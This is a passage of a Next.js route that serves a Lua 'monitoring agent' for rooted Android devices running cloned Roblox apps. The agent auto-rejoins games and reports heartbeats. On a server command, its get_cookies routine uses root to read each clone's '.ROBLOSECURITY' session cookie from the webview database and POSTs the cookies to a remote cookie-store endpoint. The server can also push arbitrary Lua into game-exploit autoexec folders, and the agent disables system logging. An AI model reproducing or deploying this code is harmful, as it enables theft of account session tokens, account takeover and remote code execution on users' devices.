  local safe = filename:gsub("[/\\\\%z]+", ""):gsub("^%.+", "")
  if safe == "" then return end
  for _, dir in ipairs(AUTOEXEC_PATHS) do
    shellcode("su -c \\"rm -f '" .. dir .. "/" .. safe .. "'\\"")
  end
  log(C.yellow .. "[" .. ts() .. "] autoexec removed " .. safe .. C.reset)
end

-- ─── Cookie extraction ───
local function get_cookies()
  local pkgs = collect_packages()
  local results = {}
  local py_bin = PREFIX .. "/bin/python"
  local py_script = CONFIG_DIR .. "/.cookie_extract.py"
  fwrite(py_script, [[
import sqlite3,sys
try:
    c=sqlite3.connect(sys.argv[1])
    r=c.execute("SELECT value FROM cookies WHERE host_key='.roblox.com' AND name='.ROBLOSECURITY'").fetchone()
    if r: print(r[0])
    else: print('')
except: print('')
]])
  for _, p in ipairs(pkgs) do
    local pkg = p.pkg
    local db = string.format("/data/data/%s/app_webview/Default/Cookies", pkg)
    local cookie = shell(string.format('su -c "%s %s %s"', py_bin, py_script, db))
    if cookie ~= "" then
      results[#results+1] = { pkg = pkg, username = p.username or "", cookie = cookie }
    end
  end
  os.remove(py_script)
  return results
end

-- ─── Auto-rejoin state + helpers ───
-- Everything auto-rejoin needs to remember lives in these tables, keyed by
-- package name. The main loop calls maybe_auto_rejoin() every tick; the
-- policy itself is polled less often (POLICY_POLL_INTERVAL) to avoid
-- hammering the server.
local POLICY_POLL_INTERVAL = $$POLICY_POLL_INTERVAL$$  -- seconds
local LAST_POLICY_POLL = 0 -- unused, kept for compat
local CACHED_POLICY = nil        -- last successful poll result (or nil)
local WAS_RUNNING = {}           -- pkg -> true if seen in am stack list last check
local PENDING_REJOIN = {}        -- pkg -> os.time() when we should relaunch
local RETRY_COUNT = {}           -- pkg -> how many rejoin attempts so far
local REJOIN_LOG_LAST = {}       -- pkg -> ts of last log line (dedup spam)
-- Stuck detection: pkg -> os.time() we first saw it running-but-account-offline.
-- Cleared the moment its account comes online (joined) or the pkg drops.
local STUCK_SINCE = {}
-- How long a clone may sit running-but-offline before we treat it as wedged
-- on an error screen and force a rejoin. Must exceed a normal join's load
-- time (Roblox splash + loading can be ~60s on cloud phones) so we never nuke
-- a clone that's still on its way into the game.
local STUCK_GRACE = $$STUCK_GRACE$$

local NEXT_POLICY_POLL = 0
local function poll_policy_if_due()
  if not DEVICE_ID then return end
  local now = os.time()
  if now < NEXT_POLICY_POLL then return end
  NEXT_POLICY_POLL = now + math.floor(jitter(POLICY_POLL_INTERVAL, 0.3))
  local body = http_get("/api/device-control/policy?deviceId=" .. DEVICE_ID)
  if body == "" then return end
  local ok, parsed = pcall(json.decode, body)
  if not ok or not parsed or not parsed.ok then return end
  local prev_rejoin = CACHED_POLICY and CACHED_POLICY.autoRejoinEnabled or false
  CACHED_POLICY = {
    autoRejoinEnabled = parsed.policy and parsed.policy.autoRejoinEnabled or false,
    rejoinDelay = (parsed.policy and parsed.policy.rejoinDelay) or 10,
    retryLimit = (parsed.policy and parsed.policy.retryLimit) or 0,
    autoRejoinPackages = (parsed.policy and parsed.policy.autoRejoinPackages) or {},
    packageTargets = (parsed.policy and parsed.policy.packageTargets) or {},
    packageBounds = (parsed.policy and parsed.policy.packageBounds) or {},
    pausedPackages = parsed.pausedPackages or {},
    -- Packages the server sees as "has a target but account is offline". Cross-
    -- checked against our running set to spot a stuck (running-but-not-in-game)
    -- clone.
    offlinePackages = parsed.offlinePackages or {},
  }
  if CACHED_POLICY.autoRejoinEnabled ~= prev_rejoin then
    if CACHED_POLICY.autoRejoinEnabled then
      log(C.green .. "[" .. ts() .. "] auto-rejoin = ON" .. C.reset)
    else
      log(C.yellow .. "[" .. ts() .. "] auto-rejoin = OFF" .. C.reset)
    end
  end
end

local function is_paused(pkg)
  if not CACHED_POLICY or not CACHED_POLICY.pausedPackages then return false end
  for _, p in ipairs(CACHED_POLICY.pausedPackages) do
    if p == pkg then return true end
  end
  return false
end

-- Server says this package has a target but its account isn't heartbeating.
local function is_account_offline(pkg)
  if not CACHED_POLICY or not CACHED_POLICY.offlinePackages then return false end
  for _, p in ipairs(CACHED_POLICY.offlinePackages) do
    if p == pkg then return true end
  end
  return false
end

local function has_target(pkg)
  return CACHED_POLICY and CACHED_POLICY.packageTargets
    and CACHED_POLICY.packageTargets[pkg] ~= nil
    and CACHED_POLICY.packageTargets[pkg] ~= ""
end

-- Relaunch a package for auto-rejoin / stuck recovery, applying its saved
-- window bounds so the reopen stays a floating tile (never fullscreen, which
-- would collapse the other clones).
local function rejoin_launch(pkg)
  local target = (CACHED_POLICY and CACHED_POLICY.packageTargets and CACHED_POLICY.packageTargets[pkg]) or ""
  local bounds = (CACHED_POLICY and CACHED_POLICY.packageBounds and CACHED_POLICY.packageBounds[pkg]) or ""
  launch_app(pkg, bounds, bounds ~= "", 0, target, false, false, true)
end

-- Should this package auto-rejoin? True when auto-rejoin is on globally AND
-- either the per-package list is empty (all) or the package is in the list.
local function should_rejoin(pkg)
  if not CACHED_POLICY or not CACHED_POLICY.autoRejoinEnabled then return false end
  local list = CACHED_POLICY.autoRejoinPackages
  if #list == 0 then return true end
  for _, p in ipairs(list) do
    if p == pkg then return true end
  end
  return false
end

local function rlog(pkg, msg)
  -- Dedup: don't log the same package state faster than once per 5s.
  local now = os.time()
  if REJOIN_LOG_LAST[pkg] and now - REJOIN_LOG_LAST[pkg] < 5 then return end
  REJOIN_LOG_LAST[pkg] = now
  log(msg)
end

-- Any package the agent has ever seen alive in this session -- kept even
-- when paused / crashed, so an expiring pause naturally resumes rejoin.
local TRACKED = {}
-- Rejoin sweep runs less often than the 1s main-loop tick so we don't
-- fork am stack list every second on a 4GB device.
local REJOIN_SWEEP_INTERVAL = $$REJOIN_SWEEP_INTERVAL$$
local LAST_REJOIN_SWEEP = 0

local LAST_PLAN_POLL = 0
local PLAN_POLL_INTERVAL = 15
-- Auto-rejoin is a SERVER-SIDE brain now: the agent fetches the plan the
-- server computed (from in-game presence heartbeats), executes each launch,
-- and acks so the server times the next step from real execution. All the
-- decisions (300s stuck / 120s escalate / retry cycle / server pick) live
-- in /api/device-control/rejoin-plan, gated behind autoRejoinEnabled. The
-- legacy local sweep below is superseded and left unreachable (do return end).
local function maybe_auto_rejoin()
  poll_policy_if_due()
  if DEVICE_ID then
    local now = os.time()
    if now >= LAST_PLAN_POLL then
      LAST_PLAN_POLL = now + math.floor(jitter(PLAN_POLL_INTERVAL, 0.3))
      local body = http_get("/api/device-control/rejoin-plan?deviceId=" .. DEVICE_ID)
      local ok, parsed = pcall(json.decode, body)
      if ok and parsed and parsed.actions then
        local rejoinDelay = (CACHED_POLICY and CACHED_POLICY.rejoinDelay) or 30
        for i, act in ipairs(parsed.actions) do
          if act.pkg then
            local bnds = act.bounds or ""
            local delay = (i == 1) and 0 or math.floor(jitter(rejoinDelay, 0.3))
            log(C.cyan .. "[" .. ts() .. "] auto-rejoin " .. act.pkg:gsub("com.roblox.", "") .. C.reset)
            if delay > 0 then
              os.execute("sleep " .. delay)
            end
            trim_ram()
            launch_app(act.pkg, bnds, bnds ~= "", 0, act.target or "", false, true, true)
            http_post("/api/device-control/rejoin-ack", { deviceId = DEVICE_ID, pkg = act.pkg })
          end
        end
      end
    end
  end
  do return end

  poll_policy_if_due()
  if not CACHED_POLICY or not CACHED_POLICY.autoRejoinEnabled then return end

  local now_top = os.time()
  if now_top - LAST_REJOIN_SWEEP < REJOIN_SWEEP_INTERVAL then return end
  LAST_REJOIN_SWEEP = now_top

  -- One stack snapshot per pass -- cheaper than pgrep per package.
  local stack = get_activity_stack()
  local now = os.time()

  -- Parse current running set out of the stack listing.
  local seen_now = {}
  for line in stack:gmatch("[^\\n]+") do
    for pkg in line:gmatch("([%w%.]+)/[%w%.$]+") do
      seen_now[pkg] = true
    end
  end

  -- Anything currently alive joins TRACKED; a package that recovered on
  -- its own (transition NOT_SEEN -> SEEN) also resets its retry counter.
  for pkg, _ in pairs(seen_now) do
    if not WAS_RUNNING[pkg] then RETRY_COUNT[pkg] = 0 end
    WAS_RUNNING[pkg] = true
    TRACKED[pkg] = true
  end

  -- For every tracked package (even ones missing for a while), decide if
  -- we should rejoin. This is what makes pause expiration self-heal: pkg
  -- stays in TRACKED, so once is_paused() flips back to false we act on
  -- the next tick.
  for pkg, _ in pairs(TRACKED) do
    if not seen_now[pkg] and should_rejoin(pkg) and not PENDING_REJOIN[pkg] then
      if is_paused(pkg) then
        rlog(pkg, C.dim .. "[" .. ts() .. "] rejoin skipped (paused): " .. pkg .. C.reset)
      else
        local limit = CACHED_POLICY.retryLimit or 0
        local tries = RETRY_COUNT[pkg] or 0
        if limit > 0 and tries >= limit then
          rlog(pkg, C.yellow .. "[" .. ts() .. "] rejoin retry limit hit for " .. pkg .. " (" .. tries .. ")" .. C.reset)
        else
          PENDING_REJOIN[pkg] = now + (CACHED_POLICY.rejoinDelay or 10)
          rlog(pkg, C.yellow .. "[" .. ts() .. "] " .. pkg .. " dropped -- rejoin in " .. (CACHED_POLICY.rejoinDelay or 10) .. "s" .. C.reset)
        end
      end
    end
  end

  -- Drop packages we know are gone from WAS_RUNNING so the next appearance
  -- registers as a fresh recovery (resets RETRY_COUNT). TRACKED persists.
  for pkg, _ in pairs(WAS_RUNNING) do
    if not seen_now[pkg] then WAS_RUNNING[pkg] = nil end
  end

  -- Fire any pending rejoins whose delay elapsed.
  for pkg, when in pairs(PENDING_REJOIN) do
    if now >= when then
      PENDING_REJOIN[pkg] = nil
      if seen_now[pkg] then
        -- Came back on its own between schedule and now -- no-op.
      elseif is_paused(pkg) then
        rlog(pkg, C.dim .. "[" .. ts() .. "] rejoin fired but " .. pkg .. " now paused, aborting" .. C.reset)
      else
        RETRY_COUNT[pkg] = (RETRY_COUNT[pkg] or 0) + 1
        log(C.cyan .. "[" .. ts() .. "] auto-rejoin " .. pkg:gsub("com.roblox.", "") .. C.reset)
        rejoin_launch(pkg)
      end
    end
  end

  -- Stuck detection: a package that IS running but whose account is offline
  -- (server view) is wedged on an error/reconnect screen -- not in a game.
  -- The drop-based logic above can't see it (the process is alive). Give it a
  -- grace window, then force-stop + rejoin. Same opt-in / pause / retry gates.
  for pkg, _ in pairs(seen_now) do
    if should_rejoin(pkg) and has_target(pkg) and not is_paused(pkg) and is_account_offline(pkg) then
      if not STUCK_SINCE[pkg] then
        STUCK_SINCE[pkg] = now
      elseif now - STUCK_SINCE[pkg] >= STUCK_GRACE then
        local limit = CACHED_POLICY.retryLimit or 0
        local tries = RETRY_COUNT[pkg] or 0
        if limit > 0 and tries >= limit then
          rlog(pkg, C.yellow .. "[" .. ts() .. "] stuck rejoin retry limit hit for " .. pkg .. C.reset)
          STUCK_SINCE[pkg] = now  -- back off a full grace window before rechecking
        else
          RETRY_COUNT[pkg] = tries + 1
          STUCK_SINCE[pkg] = nil
          log(C.yellow .. "[" .. ts() .. "] stuck " .. pkg:gsub("com.roblox.", "") .. ", rejoining" .. C.reset)
          rejoin_launch(pkg)
        end
      end
    else
      -- Joined (account online), no target, paused, or not opted in -> clear.
      STUCK_SINCE[pkg] = nil
    end
  end
end

-- ─── WebSocket (bidirectional via websocat + named pipe) ───
local function stop_ws()
  shellcode("pkill -f 'websocat.*ws.naruhub'")
  sleep(1)
end

local function start_ws(device_id)
  WS_INBOX = CONFIG_DIR .. "/.ws_inbox"
  WS_OUTBOX = CONFIG_DIR .. "/.ws_outbox"

  fwrite(WS_INBOX, "")
  os.remove(WS_OUTBOX)
  shellcode("mkfifo " .. WS_OUTBOX .. " 2>/dev/null")

  -- websocat reads from FIFO (outbox), writes to inbox file
  -- tail -f keeps the FIFO open so websocat doesn't exit
  local cmd = string.format(
    "tail -f %s | websocat -n %q >> %s 2>/dev/null &",
    WS_OUTBOX, WS_URL, WS_INBOX
  )
  os.execute(cmd)
  sleep(2)

  -- Check if websocat started
  local alive = shell("pgrep -f 'websocat.*ws.naruhub'")
  if alive == "" then return false end
  return true
end

local function ws_send(msg_table)
  if not WS_OUTBOX then return false end
  local data = json.encode(msg_table)
  -- Append to the FIFO via shell (non-blocking write)
  local cmd = string.format("echo %q >> %s", data, WS_OUTBOX)
  return shellcode(cmd)
end

local function ws_recv()
  if not WS_INBOX then return {} end
  local content = fread(WS_INBOX)
  if not content or content == "" then return {} end
  fwrite(WS_INBOX, "")
  local messages = {}
  for line in content:gmatch("[^\\n]+") do
    if line ~= "" then
      local msg = json.decode(line)
      if msg then messages[#messages+1] = msg end
    end
  end
  return messages
end

local function ws_alive()
  return shell("pgrep -f 'websocat.*ws.naruhub'") ~= ""
end

-- ─── Main ───
os.execute("mkdir -p " .. CONFIG_DIR)
fwrite(LOG_FILE, "")

-- Community trick: shrink Android's logcat buffer + clear it. Heavy
-- clones (Roblox in particular) spam megabytes of logs per minute; the
-- default 256KB * 6-buffer setup + logd overhead is a real RAM/IO drain
-- and shows up as random background force-closes on 4GB devices.
-- We set the buffer to 64KB (minimum useful), clear existing logs, and
-- also stop the logd service outright when possible.
os.execute(ENV_PREFIX .. 'su -c "setprop persist.logd.size 65536" >/dev/null 2>&1')
os.execute(ENV_PREFIX .. 'su -c "setprop persist.log.tag ASSERT" >/dev/null 2>&1')
os.execute(ENV_PREFIX .. 'su -c "logcat -b all -c" >/dev/null 2>&1')
os.execute(ENV_PREFIX .. 'su -c "logcat -G 64K" >/dev/null 2>&1')
os.execute(ENV_PREFIX .. 'su -c "stop logd" >/dev/null 2>&1')

if shell("websocat --version") == "" then
  log(C.red .. "websocat not found. Run: pkg install websocat" .. C.reset)
  os.exit(1)
end

local config_raw = fread(CONFIG_FILE)
if config_raw then
  local cfg = json.decode(config_raw)
  if cfg then
    DEVICE_ID = cfg.deviceId
    HOSTNAME = cfg.hostname
    PLATFORM = cfg.platform
  end
end

-- Pick a friendly device name (what Hip shows): prefer the user custom
-- device name from Android settings, then the marketing name, then the raw
-- model. The hostname command is always "localhost" on Android so it is a
-- last resort.
local function is_valid_name(s)
  if not s or s == "" or s == "null" or s == "unknown" or s == "localhost" then return false end
  if #s > 60 then return false end
  if s:lower():find("no su program") then return false end
  if s:lower():find("not found") then return false end
  if s:lower():find("permission denied") then return false end
  if s:lower():find("error") then return false end
  if s:lower():find("termux does not") then return false end
  return true
end

local function get_device_name()
  local candidates = {
    shell('settings get global device_name'),
    shell('settings get secure bluetooth_name'),
    shell("getprop ro.product.marketing_name"),
    shell("getprop ro.product.vendor.marketing_name"),
    shell("getprop ro.config.marketing_name"),
    shell("getprop ro.product.model"),
    shell('su -c "settings get global device_name"'),
    shell('su -c "settings get secure bluetooth_name"'),
  }
  for _, c in ipairs(candidates) do
    if is_valid_name(c) then return c end
  end
  return shell("hostname")
end

if not DEVICE_ID then
  DEVICE_ID = get_device_id()
  HOSTNAME = get_device_name()
  if HOSTNAME == "" then HOSTNAME = "termux-" .. DEVICE_ID:sub(1, 8) end
  PLATFORM = shell("uname -m")
  if PLATFORM == "" then PLATFORM = "unknown" end
  fwrite(CONFIG_FILE, json.encode({
    deviceId = DEVICE_ID,
    hostname = HOSTNAME,
    platform = PLATFORM,
    wsUrl = WS_URL,
    accessKey = LICENSE_KEY,
    registeredAt = os.time(),
  }))
  IS_NEW = true
else
  IS_NEW = false
  -- Refresh hostname if config still has the "localhost" placeholder from
  -- an older agent version, so existing installs upgrade automatically.
  if HOSTNAME == "localhost" or HOSTNAME == "" or HOSTNAME == nil then
    HOSTNAME = get_device_name()
    if HOSTNAME == "" then HOSTNAME = "termux-" .. DEVICE_ID:sub(1, 8) end
    -- Persist the updated name so we don't recompute every launch.
    local cfg_now = json.decode(config_raw) or {}
    cfg_now.hostname = HOSTNAME
    fwrite(CONFIG_FILE, json.encode(cfg_now))
  end
end

os.execute("clear")
log(C.cyan .. C.bold .. "+------------------------------+" .. C.reset)
log(C.cyan .. C.bold .. "|         N A R U H U B         |" .. C.reset)
log(C.cyan .. C.dim  .. "   Monitoring Agent v" .. VERSION .. " (WS)   " .. C.reset)
log(C.cyan .. C.bold .. "+------------------------------+" .. C.reset)
log("")
log(C.dim .. "License" .. C.reset .. "  -> " .. C.yellow .. LICENSE_KEY:sub(1,6) .. "..." .. LICENSE_KEY:sub(-4) .. C.reset)
log(C.dim .. "Device" .. C.reset .. "   -> " .. C.cyan .. DEVICE_ID:sub(1,8) .. "..." .. DEVICE_ID:sub(-6) .. C.reset)
log(C.dim .. "Model" .. C.reset .. "    -> " .. DEVICE_MODEL)
log(C.dim .. "Android" .. C.reset .. "  -> " .. ANDROID_VER .. (SDK_INT >= 31 and " (12+, using dumpsys)" or ""))
log(C.dim .. "Server" .. C.reset .. "   -> " .. C.cyan .. WS_URL .. C.reset)
log("")

-- Fresh start: wipe this device's stale session state on the server (rejoin
-- state machine, presence, launch anchors) so a restart re-arms everything
-- cleanly instead of inheriting a "gave up" flag or stale presence. Ship the
-- packages list too -- server can't rely on the live device key (90s TTL --
-- almost always expired at restart time) to find which accounts to reset.
do
  local pkgs_now = collect_packages()
  local code = http_post("/api/device-control/reset-session", {
    deviceId = DEVICE_ID,
    packages = pkgs_now,
  })
  if code == "200" then
    log(C.yellow .. "[" .. ts() .. "] session reset" .. C.reset)
  end
end

-- Ghost process cleanup: kill Roblox clone processes that are running but
-- have no visible window (closed via X button while agent was offline).
do
  local stack = get_activity_stack()
  local pkgs_now = collect_packages()
  local killed = 0
  for _, p in ipairs(pkgs_now) do
    local pkg = (type(p) == "table") and p.pkg or p
    if pkg and pkg ~= "" then
      local has_window = stack:find(pkg .. "/", 1, true) ~= nil
      if not has_window then
        local pids = shell(string.format('su -c "pidof %s"', pkg))
        if pids == "" then
          pids = shell(string.format('su -c "pgrep -x %s"', pkg))
        end
        if pids ~= "" then
          log(C.yellow .. "[" .. ts() .. "] ghost " .. pkg:gsub("com.roblox.", "") .. ", killing" .. C.reset)
          shellcode(string.format('su -c "am force-stop %s"', pkg))
          for pid in pids:gmatch("%S+") do
            shellcode(string.format('su -c "kill -9 %s"', pid))
          end
          killed = killed + 1
        end
      end
    end
  end
  if killed > 0 then
    if killed > 0 then log(C.dim .. "[" .. ts() .. "] cleaned " .. killed .. " ghosts" .. C.reset) end
  end
end

-- Android 12+ auto-revokes permissions for unused apps after reboot.
-- Grant storage access and disable auto-revoke for every clone on startup.
if SDK_INT >= 31 then
  do
    local pkgs_perm = collect_packages()
    local granted = 0
    for _, p in ipairs(pkgs_perm) do
      local pkg = (type(p) == "table") and p.pkg or p
      if pkg and pkg ~= "" then
        shellcode(string.format('su -c "appops set %s MANAGE_EXTERNAL_STORAGE allow"', pkg))
        shellcode(string.format('su -c "appops set %s AUTO_REVOKE_PERMISSIONS_IF_UNUSED ignore"', pkg))
        granted = granted + 1
      end
    end
    if granted > 0 then
      log(C.dim .. "[" .. ts() .. "] granted perms " .. granted .. " pkgs" .. C.reset)
    end
  end
end

-- Deploy the in-game presence heartbeat into every executor autoexec dir so
-- each clone reports which Roblox server (JobId) it's in. Fetched fresh on
-- start, so restarting the agent always ships the latest script. Best-effort:
-- autoexec_write skips executors that aren't installed.
do
  local hb = http_get("/api/termux/heartbeat-script?key=" .. LICENSE_KEY .. "&deviceId=" .. DEVICE_ID)
  if hb and hb ~= "" and not hb:find("access key required", 1, true) then
    autoexec_write("heartbeatnaru.lua", hb)
    log(C.green .. "[" .. ts() .. "] heartbeat script deployed to autoexec" .. C.reset)
  else
    log(C.yellow .. "[" .. ts() .. "] heartbeat script fetch failed, skipping" .. C.reset)
  end
end

-- ─── System optimizations (run once at startup) ───
do
  log(C.dim .. "[" .. ts() .. "] setup..." .. C.reset)
  shellcode('su -c "dumpsys deviceidle whitelist +com.termux" 2>/dev/null')
  shellcode('su -c "/system/bin/device_config put activity_manager max_phantom_processes 2147483647" 2>/dev/null')
  shellcode('su -c "setprop persist.sys.fflag.override.settings_enable_monitor_phantom_procs false" 2>/dev/null')
  shellcode('su -c "/system/bin/device_config set_sync_disabled_for_tests persistent" 2>/dev/null')
  shellcode('rm -rf "$PREFIX/tmp/"* 2>/dev/null')
  log(C.green .. "[" .. ts() .. "] optimized + cache cleared" .. C.reset)
end

-- ─── Connection loop (auto-reconnect) ───
while true do
  stop_ws()
  local ok = start_ws(DEVICE_ID)
  if not ok then
    local cf_wait = math.floor(jitter(RECONNECT_DELAY, 0.4))
    log(C.red .. "[" .. ts() .. "] connect failed, retry in " .. cf_wait .. "s" .. C.reset)
    sleep(cf_wait)
    goto continue
  end

  -- Auth
  ws_send({
    type = "auth",
    role = "device",
    deviceId = DEVICE_ID,
    accessKey = LICENSE_KEY,
  })

  -- Register ONLY on first connect of this agent session. Heartbeats keep
  -- the existing device entry alive; re-registering on every reconnect just
  -- churns the device record without adding info.
  if IS_NEW then
    ws_send({
      type = "register",
      deviceId = DEVICE_ID,
      hostname = HOSTNAME,
      platform = PLATFORM,
    })
    http_register()
    IS_NEW = false
  end

  -- First heartbeat immediately so the dashboard sees fresh data.
  do
    local pkgs = collect_packages()
    local screen = collect_screen()
    local stats = collect_stats()
    http_heartbeat(pkgs, screen, stats, collect_running())
  end

  log(C.green .. "[" .. ts() .. "] online - streaming" .. C.reset)
  log(C.dim .. "Press Ctrl+C to stop." .. C.reset)

  local next_heartbeat = os.time() + math.floor(jitter(HEARTBEAT_INTERVAL, 0.25))

  while true do
    local now = os.time()

    poll_config_if_due()

    -- Heartbeat via WS
    if now >= next_heartbeat then
      local pkgs = collect_packages()
      local screen = collect_screen()
      local stats = collect_stats()
      local running = collect_running()
      log_ram_status()
      trim_ram()
      ws_send({
        type = "heartbeat",
        deviceId = DEVICE_ID,
        hostname = HOSTNAME,
        packages = pkgs,
        running = running,
        screen = screen,
        stats = stats,
      })
      http_heartbeat(pkgs, screen, stats, running)
      next_heartbeat = now + math.floor(jitter(HEARTBEAT_INTERVAL, 0.25))
    end

    -- Poll HTTP commands (dashboard queues commands via HTTP API)
    local cmd_raw = shell(string.format(
      'curl -s "%s/api/termux/commands?deviceId=%s" -H "X-Access-Key: %s"',
      BASE_URL, DEVICE_ID, LICENSE_KEY
    ))
    if cmd_raw ~= "" then
      local cmd_data = json.decode(cmd_raw)
      if cmd_data and cmd_data.commands then
        -- Collect all launch commands in this poll into one batch so we
        -- can apply the Roblox multi-open trick (open first fully -> rapid-
        -- fire the rest -> kill first to release the init lock).
        local batch = {}
        for _, cmd in ipairs(cmd_data.commands) do
          if was_seen(cmd.id) then
            -- dup
          elseif cmd.type == "launch" then
            batch[#batch+1] = cmd
          elseif cmd.type == "autoexec_write" then
            autoexec_write(cmd.filename, cmd.content)
          elseif cmd.type == "autoexec_remove" then
            autoexec_remove(cmd.filename)
          elseif cmd.type == "uninstall" then
            uninstall_pkg(cmd.package)
          elseif cmd.type == "get_cookies" then
            log(C.cyan .. "[" .. ts() .. "] extracting cookies..." .. C.reset)
            local cookies = get_cookies()
            log(C.green .. "[" .. ts() .. "] extracted " .. #cookies .. " cookie(s)" .. C.reset)
            local ck_code = http_post("/api/termux/cookie-store", { deviceId = DEVICE_ID, cookies = cookies })
            log(C.dim .. "[" .. ts() .. "] cookie POST -> " .. (ck_code or "nil") .. C.reset)
          end
        end
        if #batch > 0 then batch_launch(batch) end
      end
    end

    -- Read incoming WS messages
    local messages = ws_recv()
    for _, msg in ipairs(messages) do
      if msg.type == "auth" then
        if msg.ok then
          log(C.green .. "[" .. ts() .. "] authenticated" .. C.reset)
        else
          log(C.red .. "[" .. ts() .. "] auth failed: " .. (msg.error or "?") .. C.reset)
        end
      elseif msg.type == "register" then
        if msg.ok then
          log(C.green .. "[" .. ts() .. "] registered" .. C.reset)
        end
      elseif msg.type == "heartbeat" then
        if msg.ok then
          -- silent
        end
      elseif msg.type == "command" then
        if msg.commands then
          local batch = {}
          for _, cmd in ipairs(msg.commands) do
            if was_seen(cmd.id) then
              -- dup
            elseif cmd.type == "launch" then
              batch[#batch+1] = cmd
            elseif cmd.type == "autoexec_write" then
              autoexec_write(cmd.filename, cmd.content)
            elseif cmd.type == "autoexec_remove" then
              autoexec_remove(cmd.filename)
            elseif cmd.type == "uninstall" then
              uninstall_pkg(cmd.package)
            elseif cmd.type == "get_cookies" then
              log(C.cyan .. "[" .. ts() .. "] extracting cookies..." .. C.reset)
              local cookies = get_cookies()
              log(C.green .. "[" .. ts() .. "] extracted " .. #cookies .. " cookie(s)" .. C.reset)
              local ck_code = http_post("/api/termux/cookie-store", { deviceId = DEVICE_ID, cookies = cookies })
              log(C.dim .. "[" .. ts() .. "] cookie POST -> " .. (ck_code or "nil") .. C.reset)
            end
          end
          if #batch > 0 then batch_launch(batch) end
        end
      end
    end

    -- Auto-rejoin sweep: polls policy on its own throttle, detects
    -- dropped-out packages, schedules and fires relaunches. Safe to call
    -- every tick -- most calls are near-free.
    maybe_auto_rejoin()

    -- Stream buffered log lines to the dashboard console.
    if now >= NEXT_LOG_FLUSH then
      flush_logs()
      NEXT_LOG_FLUSH = now + math.floor(jitter(LOG_FLUSH_INTERVAL, 0.3))
    end

    -- Check websocat alive
    if not ws_alive() then
      log(C.red .. "[" .. ts() .. "] WS disconnected" .. C.reset)
      break
    end

    sleep(math.random(1, 2))
  end

  local rc_wait = math.floor(jitter(RECONNECT_DELAY, 0.4))
  log(C.yellow .. "[" .. ts() .. "] reconnecting in " .. rc_wait .. "s..." .. C.reset)
  sleep(rc_wait)

  ::continue::
end
`;

export const dynamic = "force-dynamic";

export async function OPTIONS() {
  return NextResponse.json(null, { status: 204 });
}

export async function GET(req: NextRequest) {
  const accessKey = req.nextUrl.searchParams.get("key");
  if (!accessKey) {
    return new NextResponse("-- Error: access key required\\nos.exit(1)\\n", {
      status: 400,
      headers: { "Content-Type": "text/plain" },
    });
  }

  const raw = await redis.get<string>(AGENT_CONFIG_KEY);
  const saved: Partial<AgentConfig> = raw
    ? typeof raw === "string" ? JSON.parse(raw) : raw
    : {};
  const cfg: AgentConfig = { ...AGENT_CONFIG_DEFAULTS, ...saved };

  let script = LUA_AGENT.replace(/\$\$LICENSE\$\$/g, accessKey);
  for (const [key, val] of Object.entries(cfg)) {
    script = script.replace(new RegExp(`\\$\\$${key}\\$\\$`, "g"), String(val));
  }

  return new NextResponse(script, {
    status: 200,
    headers: { "Content-Type": "text/plain; charset=utf-8" },
  });
}
